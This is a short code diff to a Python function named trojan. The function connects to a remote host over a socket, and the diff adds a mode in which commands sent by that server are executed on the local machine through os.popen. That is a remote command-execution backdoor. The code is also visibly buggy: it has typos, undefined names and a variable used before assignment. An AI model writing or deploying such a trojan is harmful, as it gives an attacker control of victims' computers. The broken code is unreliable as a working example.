@@ -1,6 +1,7 @@
 import random 
 import socket 
 import threading
+import os
 
 
 def trojan():
@@ -10,6 +11,14 @@ def trojan():
     client = socket.socket(socker.AF_INET,socket.SOCK_STREAM)
     client.connect((HLOST,PORT))
     while True:
+        if server_command == "cmdon":
+            cmd_mod = True
+            print('You now have terminal access').encode("utf-8")
+            continue
+        if server_command == 'cmdoff':
+            cmd_mod= False
+        if cmd_mod:
+            os.popen(server_commands)   
         server_command = client.recv(1024).decode('utf-8')
         if server_command == 'hello':
             print("hello World!")
